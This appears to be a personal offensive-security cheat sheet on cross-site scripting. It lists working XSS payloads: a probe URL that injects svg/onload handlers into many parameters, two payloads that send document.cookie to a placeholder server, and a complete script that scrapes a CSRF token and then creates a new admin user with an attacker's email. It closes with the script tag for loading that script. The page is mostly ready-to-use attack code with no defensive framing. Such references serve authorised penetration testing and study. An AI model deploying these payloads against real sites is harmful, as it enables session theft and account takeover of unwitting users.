---
layout: blank
pagetitle: XSS
---

**XSS**
- Cross-site Scripting occurs when you can inject arbitrary JavaScript into another user's page
- Very nice for performing authenticated actions, keylogging, or stealing cookies if they aren't HttpOnly

**Checking Common Parameters**
- Try something like `/?uname='>"<svg/onload=confirm('xss-uname')>&command='>"<svg/onload=confirm('xss-command')>&reverse='>"<svg/onload=confirm('xss-reverse')>&cancel='>"<svg/onload=confirm('xss-cancel')>&h='>"<svg/onload=confirm('xss-h')>&logout='>"<svg/onload=confirm('xss-logout')>&section='>"<svg/onload=confirm('xss-section')>&gid='>"<svg/onload=confirm('xss-gid')>&input='>"<svg/onload=confirm('xss-input')>&post_type='>"<svg/onload=confirm('xss-post_type')>&page='>"<svg/onload=confirm('xss-page')>&updated='>"<svg/onload=confirm('xss-updated')>&charset='>"<svg/onload=confirm('xss-charset')>&v='>"<svg/onload=confirm('xss-v')>` to test a bunch of parameters at once

**Stealing Cookies**
- `<script>fetch('http://{server}?c='+document.cookie)</script>`
- `<img src=x onerror=this.src='http://{server}/?c='+document.cookie>`

**Performing actions**
- Often, if we can't grab the session token, we'll want to instead perform an authenticated action as the user, like adding a new user
- We'll sometimes need to grab the CSRF token, which can be done (alongside coercing the action) using this example:
```js
(function() {
  var xhr1 = new XMLHttpRequest();
  // Grab CSRF token
  xhr1.open('GET', 'https://{target}/{path_with_CSRF_token}', true);

  xhr1.onreadystatechange = function() {
    if (xhr1.readyState === 4 && xhr1.status === 200) {
      var responseText = xhr1.responseText;

      var csrfToken = null;
	  // Grab token, for example from <meta name='csrf-token' content='...' />
      var tokenMatch = responseText.match(/<meta\s+name=['"]csrf-token['"]\s+content=['"]([^'"]+)['"]/i);

      if (tokenMatch && tokenMatch[1]) {
        csrfToken = tokenMatch[1];

        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', 'https://{target}/users/create', true);
        xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
        xhr2.setRequestHeader('X-Csrf-Token', csrfToken);
        xhr2.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

        var payload = 'email={attacker_email}&fullName=testUser&role=admin';

        xhr2.send(payload);
      }
    }
  };

  xhr1.send();
})();
```
- Then, just host the file and XSS using `<script src=http://localhost/file.js></script>`